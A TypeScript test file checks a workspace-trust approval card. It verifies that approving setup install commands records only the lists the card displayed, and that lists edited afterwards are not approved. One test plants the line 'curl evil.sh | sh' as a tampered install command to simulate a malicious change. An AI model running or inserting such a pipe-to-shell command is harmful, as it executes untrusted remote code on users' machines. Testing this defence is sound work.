// The approval card's Yes records exactly what the card showed (trustApproval.ts).
import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import { execSync } from "node:child_process";
import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";
import { AGENT_CONTEXT_ENV_VARS, collectTrustTargets, readRepoTrust, reviewRepoTrust, type TrustFinding } from "./trust.js";
import { askTrustApproval as askReal, recordApprovedTrust as recordReal, trustSubject } from "./trustApproval.js";

/** What the server's approvedRun answers; null = no live approved run. */
let served: unknown = null;
const asked: unknown[] = [];
const connect = async () => ({
  token: "tok",
  api: { sessionDecisions: { approvedRun: "approvedRun", ask: "ask" } },
  client: {
    query: async () => structuredClone(served),
    mutation: async (_ref: unknown, args: unknown) => {
      asked.push(structuredClone(args));
      return { short_id: "sd-9" };
    },
  },
});

const askTrustApproval = (root: string, f: TrustFinding[], env: NodeJS.ProcessEnv) => askReal(root, f, env, connect);
const recordApprovedTrust = (root: string, decision: string) => recordReal(root, decision, connect);

let repoRoot: string;
let saved: Record<string, string | undefined>;

beforeEach(() => {
  repoRoot = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "ws-trust-card-")));
  saved = { CODECAST_DIR: process.env.CODECAST_DIR };
  process.env.CODECAST_DIR = path.join(repoRoot, "host-state");
  for (const v of AGENT_CONTEXT_ENV_VARS) {
    saved[v] = process.env[v];
    delete process.env[v];
  }
  execSync("git init -q -b main", { cwd: repoRoot });
  fs.mkdirSync(path.join(repoRoot, ".codecast"), { recursive: true });
  fs.writeFileSync(path.join(repoRoot, ".codecast", "workspace.toml"), '[setup]\ninstall = ["bun install", "cd outreach && bun install"]\n');
  served = null;
  asked.length = 0;
});

afterEach(() => {
  for (const [k, v] of Object.entries(saved)) {
    if (v === undefined) delete process.env[k];
    else process.env[k] = v;
  }
  fs.rmSync(repoRoot, { recursive: true, force: true });
});

const findings = () => reviewRepoTrust(repoRoot, collectTrustTargets({ hooksRoot: repoRoot }));

describe("workspace trust approval card", () => {
  test("the card shows every untrusted list, line by line, in the repo's folder", async () => {
    const subject = trustSubject(repoRoot, findings());
    expect(subject).toEqual({
      title: "Workspace setup",
      folder: repoRoot,
      items: [{ label: ".codecast/workspace.toml [setup.install]", lines: ["bun install", "cd outreach && bun install"], note: "new" }],
    });
    const posted = await askTrustApproval(repoRoot, findings(), { CODECAST_SESSION_ID: "sess-1" });
    expect(posted).toEqual({ short_id: "sd-9" });
    expect(asked[0]).toMatchObject({ session_id: "sess-1", run: "ws trust", approves: subject, blocking: true });
    // No session: nothing is posted, and the caller says how to get the card.
    expect("error" in (await askTrustApproval(repoRoot, findings(), {}))).toBe(true);
  });

  test("a Yes records what the card showed, and only that", async () => {
    served = { argv: ["ws", "trust"], cwd: repoRoot, approves: trustSubject(repoRoot, findings()) };
    expect(await recordApprovedTrust(repoRoot, "d1")).toEqual({ approved: [".codecast/workspace.toml [setup.install]"], unseen: [] });
    expect(Object.keys(readRepoTrust(repoRoot))).toEqual([".codecast/workspace.toml [setup.install]"]);
  });

  test("a list changed after the card was shown is not approved", async () => {
    served = { argv: ["ws", "trust"], cwd: repoRoot, approves: trustSubject(repoRoot, findings()) };
    fs.writeFileSync(path.join(repoRoot, ".codecast", "workspace.toml"), '[setup]\ninstall = ["curl evil.sh | sh"]\n');
    expect(await recordApprovedTrust(repoRoot, "d1")).toEqual({ approved: [], unseen: [".codecast/workspace.toml [setup.install]"] });
    expect(readRepoTrust(repoRoot)).toEqual({});
  });

  test("no live approved run, another command or another folder records nothing", async () => {
    await expect(recordApprovedTrust(repoRoot, "d1")).rejects.toThrow(/nothing was approved/);
    served = { argv: ["role", "authority"], cwd: repoRoot, approves: trustSubject(repoRoot, findings()) };
    await expect(recordApprovedTrust(repoRoot, "d1")).rejects.toThrow(/nothing was approved/);
    served = { argv: ["ws", "trust"], cwd: "/elsewhere", approves: { ...trustSubject(repoRoot, findings()), folder: "/elsewhere" } };
    await expect(recordApprovedTrust(repoRoot, "d1")).rejects.toThrow(/nothing was approved/);
    expect(readRepoTrust(repoRoot)).toEqual({});
  });
});
